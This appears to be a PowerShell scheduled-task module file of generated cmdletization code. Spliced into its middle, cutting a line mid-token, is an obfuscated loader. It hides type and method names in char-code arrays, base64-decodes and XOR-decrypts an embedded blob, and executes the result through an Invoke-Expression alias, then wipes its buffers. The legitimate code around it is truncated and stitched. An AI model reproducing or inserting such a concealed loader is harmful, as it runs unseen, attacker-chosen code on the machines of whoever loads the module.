'Microsoft.Management.Infrastructure.CimInstance#MSFT_TaskTrigger'
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
  if ($PSBoundParameters.ContainsKey('Description')) {
    [object]$__cmdletization_value = ${Description}
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; 
ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; 
IsValuePresent = $true}
  } else {
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Description'; 
ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; 
IsValuePresent = $__cmdletization_defaultValueIsPresent}
  }
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; 
ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; 
Value = $__cmdletization_defaultValue; IsValuePresent = 
$__cmdletization_defaultValueIsPresent}
  $__cmdletization_methodParameter.ParameterTypeName = 
'Microsoft.Management.Infrastructure.CimInstance#MSFT_ClusteredScheduledTask'
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

$__cmdletization_returnValue = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; 
ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = 
$false }
$__cmdletization_methodInvocationInfo = 
[Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('SetByParams', 
$__cmdletization_methodParameters, $__cmdletization_returnValue)

$__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)
  }
  { @('Xml') -contains $_ } {
  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
  if ($PSBoundParameters.ContainsKey('Xml')) {
    [object]$__cmdletization_value = ${Xml}
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Xml'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
  } else {
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Xml'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent 
= $__cmdletization_defaultValueIsPresent}
  }
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
  if ($PSBoundParameters.ContainsKey('Cluster')) {
    [object]$__cmdletization_value = ${Cluster}
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
  } else {
    $__cmdletization_methodParameter = 
[Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Cluster'; ParameterType = 
'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent 
= $__cmdletization_defaultValueIsPresent}
  }
  $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

  [object]$__cmdletization_defaultValue = $null
  [object]$__cmdletization_defaultValueIsPresent = $false
  if ($PSBoundParameters.ContainsKey('TaskName')) {
    [object]$__cmdletization_value = ${TaskName}
    $__cmdletization_methodParameter = [Microso
zzzzzzzzzzzzzzz($uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuu, 
$aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa) {
$uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuu = zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz 
$uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
$uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu = 
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz $uuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuu $aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaa.($zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz)
$uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu = [byte[]]::new($aaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.($zzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz))

for ($zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzz = 0; $zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzz -lt $aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaa.($zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz); $zzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz = $zzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz + 1) {
$uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu[$zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz] = $aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[$zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz] -bxor $uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu[$zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz]
}

return ,$uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
}



$zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz = $zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzz -replace ([string]::new(([char[]]@(10)))), '' -replace 
([string]::new(([char[]]@(32)))), ''
$zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz = ([type]([string]::new(([char[]]@(83,121,115,116,101,10
9,46,67,111,110,118,101,114,116)))))::([string]::new(([char[]]@(70,114,111,109,66,97,115,
101,54,52,83,116,114,105,110,103))))($zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz)

$uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu = ([type
]([string]::new(([char[]]@(83,121,115,116,101,109,46,84,101,120,116,46,69,110,99,111,100,
105,110,103)))))::([string]::new(([char[]]@(85,84,70,56)))).([string]::new(([char[]]@(71,
101,116,66,121,116,101,115))))(([string]::new(([char[]]@(70,49,89,70,116,88,111,71,55,49,
48,97,118,85,77,104,88,97,83,75,122,54,75,85,108,115,65,103,110,112,120,113,107,75,55,72,
111,97,68,61,107,72,76,120,78,102,111,75,112,102,104,80,108,67,98,89,83,100,47,100,72,72,
56,70,90,77,76,79,120,87,66,122,68,112,111,100,117,71,67,89,73,75,101,54,69,86,89,85,68,1
08,47,48,49,88,85,111,86,54,87,65,80,70,80,79,85,108,70,56,87,51,109,117,54,121,75,113,54
,78,98,68,98,52,86,75,87,116,48,82,107,111,76,72,89,104,98,120,112,114,57,55,67,114,66,11
9,120,105,87,50,121,84,85,67,56,119,114,114,97,54,77,56,108,56,101,76,48,80,104,89,49,89,
122,61,55,121,55,113,97,112,114,109,73,54,111,114,103,50,82,111,61,88,79,72,56,99,88,104,
82,50,50,101,109,77,70,49,108,120,89,75,86,50,85,110,79,105,89,69,97,102,86,104,89,113,10
3,98,83,98,50,110,106,103,56,79,78,99,54,120,119,117,56,119,49,53,65,67,115,84,108,116,83
,122,87,103,71,122,54,108,49,101,49,97,106,53,112,75,74,110,110,113,82,54,72,115,78,82,10
7,51,108,119,117,105,102,119,75,74,99,75,51,65,117,67,98,99,61,82,100,67,90,109,112,71,55
,111,101,105,99,116,51,78,122,47,43,47,120,107,98,99,100,72)))))
$aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa = zzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz 
$uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu $zzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzz

$aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa = (226 - 31)
$aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa = $aa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[$aaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaa..($aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaa.($zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzz) - 1)]

$zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz = ([type]([string]::new(([char[]]@(83
,121,115,116,101,109,46,84,101,120,116,46,69,110,99,111,100,105,110,103)))))::([string]::
new(([char[]]@(85,84,70,56)))).([string]::new(([char[]]@(71,101,116,83,116,114,105,110,10
3))))($aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
)

& (GI Alias:\iex) $zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz

for ($zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zz = 0; $zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzz -lt $uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
u.($zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz); $zzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz++) { $uuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu
uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu[$zzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz] = 0 }
for ($zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zz = 0; $zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzz -lt $zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz.($zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzz); $zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzz++) { $zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz[$zzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz] = 0 }
for ($zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zz = 0; $zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
zzzzz -lt $aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaa.($zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz); 
$zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
alue = $__cmdletization_defaultValue; IsValuePresent = 
$__cmdletization_defaultValueIsPresent}
    $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

$__cmdletization_returnValue = $null
$__cmdletization_methodInvocationInfo = 
[Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Enable', 
$__cmdletization_methodParameters, $__cmdletization_returnValue)
$__cmdletization_passThru = $false
      if ($PSBoundParameters.ContainsKey('InputObject')) {
          foreach ($x in $InputObject) { 
$__cmdletization_objectModelWrapper.ProcessRecord($x, 
$__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
      } else {
          
$__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, 
